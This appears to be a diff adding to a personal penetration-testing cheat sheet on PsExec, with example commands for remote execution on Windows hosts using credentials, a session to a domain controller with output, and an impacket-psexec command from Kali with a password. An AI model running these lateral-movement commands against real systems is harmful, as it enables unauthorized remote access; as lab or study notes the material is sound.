@@ -1,5 +1,19 @@
+#!/usr/bin/peno
+
+#examples:
 psexec \\192.168.50.80 -u offensive -p security ipconfig
 psexec -i \myComputer cmd /c "systeminfo"
 psexec -i \myComputer -u username -p password cmd
 
+#connecting to DC
+PS C:\Tools\active_directory> .\PsExec.exe /accepteula  \\dc01 cmd.exe
 
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Windows\system32> ipconfig
+
+
+#Connecting from kali with impacket
+ /usr/bin/impacket-psexec "Allison:RockYou\!"@192.168.205.59 cmd.exe
